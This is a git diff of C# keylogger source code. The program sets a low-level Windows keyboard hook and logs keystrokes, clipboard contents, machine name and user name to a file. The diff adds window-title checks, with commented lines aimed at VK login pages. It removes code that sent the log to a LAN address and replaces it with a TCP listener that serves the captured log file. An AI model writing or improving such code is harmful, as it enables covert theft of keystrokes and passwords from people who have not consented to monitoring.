@@ -7,7 +7,8 @@ using System.IO;
 using System.Text;
 using System.Net;
 using System.Net.Sockets;
-
+using System.Diagnostics.Metrics;
+using System.Runtime.CompilerServices;
 
 namespace ConsoleApplication1
 {
@@ -15,10 +16,18 @@ namespace ConsoleApplication1
     {
         private const int WH_KEYBOARD_LL = 13;
         public const int KF_REPEAT = 0X40000000;
+        public static int _counter = 0;
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+
+
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+
+
 
         public static string? initLayout;
         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
@@ -60,19 +69,16 @@ namespace ConsoleApplication1
         {
             _hookID = SetHook(_proc);
 
-            Writer("CurrentDirectory: {0}" + Environment.CurrentDirectory);
-            Writer("MachineName: {0}" + Environment.MachineName);
-            Writer("OSVersion: {0}" + Environment.OSVersion.ToString());
-            Writer("SystemDirectory: {0}" + Environment.SystemDirectory);
-            Writer("UserDomainName: {0}" + Environment.UserDomainName);
-            Writer( "UserInteractive: {0}" + Environment.UserInteractive);
-            Writer("UserName: {0}" + Environment.UserName);
+            Writer("MachineName: " + Environment.MachineName + '\n');
+            Writer("OSVersion: " + Environment.OSVersion.ToString() + '\n');
+            Writer("UserName: " + Environment.UserName + '\n');
+            Writer("Date: "+DateTime.Now.ToShortDateString()+'\n');
 
             string htmlData = GetBuff();
 
 
             initLayout = GetKeyboardLayout().ToString();
-            Writer("Первоначальная раскладка: " + initLayout);
+            Writer("Первоначальная раскладка: " + initLayout + '\n');
             Thread mtr = new Thread(SendFile);
             mtr.Start();
             Application.Run();
@@ -261,76 +267,68 @@ namespace ConsoleApplication1
             string htmlData = Clipboard.GetText(TextDataFormat.Text);
             return htmlData;
         }
-        public static void SendFile()
+        public static async void SendFile()
         {
-            System.Net.Sockets.TcpClient TcpClient = new System.Net.Sockets.TcpClient("192.168.1.69", 85);
-            System.Net.Sockets.NetworkStream NetworkStream = TcpClient.GetStream();
-            System.IO.Stream FileStream = System.IO.File.OpenRead(Application.StartupPath + @"\log.txt");
-            byte[] FileBuffer = new byte[FileStream.Length];
+            IPAddress localAddress = IPAddress.Loopback;
+            const int localPort = 7777;
+            const string filename = "log.txt";
 
-            FileStream.Read(FileBuffer, 0, (int)FileStream.Length);
-            NetworkStream.Write(FileBuffer, 0, FileBuffer.GetLength(0));
-            NetworkStream.Close();
+            var server = new TcpListener(localAddress, localPort);
+            server.Start();
+
+            while (true)
+            {
+                var client = await server.AcceptTcpClientAsync();
+                _ = Task.Run(() => Serve(client, filename));
+            }
         }
-        //public static  void ClientSocket()
-        //{
-        //    while (true)
-        //    {
-        //        {
-        //            //using TcpClient tcpClient = new TcpClient();
-                     
-        //            try
-        //            {
-        //                //await tcpClient.ConnectAsync(IPAddress.Parse("192.168.1.69"), 82);
-        //                //MessageBox.Show("Соединение прошло успешно!");
-        //                //NetworkStream stream = tcpClient.GetStream();
-        //                //await tcpClient.Send
-
-        //                IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
-        //                Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        //                newsock.Bind(ipep);
-        //                newsock.Listen(10);
-        //                Socket client = newsock.Accept();
-        //                IPEndPoint? clientep = (IPEndPoint)client.RemoteEndPoint;
-        //                MessageBox.Show($"Connected with {clientep.Address} at port {clientep.Port}");
-        //                // FileInfo fi = new FileInfo(Application.StartupPath + @"\log.dat");
-        //                // string fsize= fi.Length.ToString();
-        //                try
-        //                {
-
-        //                    client.SendFile(Application.StartupPath + @"\log.dat");
-        //                    Console.WriteLine("Disconnected from {0}", clientep.Address);
-        //                    client.Close();
-        //                    newsock.Close();
-
-        //                }
-        //                catch (Exception ex)
-        //                {
-        //                    //MessageBox.Show(ex.Message);
-        //                }
-        //            }
-
-        //            catch (Exception ex)
-        //            {
-        //                //MessageBox.Show(ex.Message);
-        //            }
-
-
-        //        }
-        //    }
-
-        //}
-
-
-
+        static async Task Serve(TcpClient client, string filename)
+        {
+            using var _ = client;
+            var stream = client.GetStream();
+            using var file = File.OpenRead(filename);
+            var length = file.Length;
+            byte[] lengthBytes = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(length));
+            await stream.WriteAsync(lengthBytes);
+            await file.CopyToAsync(stream);
+        }
         public static void Writer(string inputstring)
         {
+            _counter++;
             StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-            sw.WriteLine(inputstring+DateTime.Now.ToString(" - [yyyy-MM-dd]HH:mm:ss"));
+            if (inputstring == "<Enter>")
+                sw.WriteLine(inputstring + DateTime.Now.ToString(" - [HH:mm:ss]"));
+            if (_counter < 101)
+                sw.Write(inputstring);
+            else 
+            {
+                sw.Write(inputstring + DateTime.Now.ToString(" - [HH:mm:ss]"));
+                _counter = 0;
+            }
             sw.Flush();
             sw.Close();
         }
 
+        bool IsForegroundWindowInteresting(String s)
+        {
+            IntPtr _hwnd = GetForegroundWindow();
+            StringBuilder sb = new StringBuilder(256);
+            GetWindowText(_hwnd, sb, sb.Capacity);
+            if (sb.ToString().ToUpperInvariant().Contains(s.ToUpperInvariant())) return true;
+            return false;
+        }
 
+
+                    //if (IsForegroundWindowInteresting("Welcome! | VK") ||
+                    //IsForegroundWindowInteresting("Добро пожаловать | ВКонтакте"))
+
+                    //return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
     }
+
+
+
+
+
+
+}
 }
